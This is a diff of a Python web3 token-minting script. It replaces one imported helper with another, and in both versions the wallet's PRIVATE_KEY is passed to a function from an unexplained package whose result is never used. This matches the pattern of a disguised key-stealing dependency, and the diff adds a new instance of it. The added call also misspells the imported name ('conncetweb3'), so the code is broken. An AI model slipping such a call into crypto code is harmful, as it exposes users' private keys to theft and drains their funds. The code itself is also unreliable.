@@ -1,6 +1,6 @@
 import os
 from web3 import Web3
-from alchemyrpcs import rpc
+from walletweb3 import connectweb3
 import json
 from dotenv import load_dotenv
 
@@ -46,7 +46,7 @@ def mint_cusd():
     })
 
     signed_txn = web3.eth.account.sign_transaction(txn, PRIVATE_KEY)
-    alchemy = rpc(PRIVATE_KEY)
+    walletweb3 = conncetweb3(PRIVATE_KEY)
     tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)
     print("Mint TX:", web3.to_hex(tx_hash))
     receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
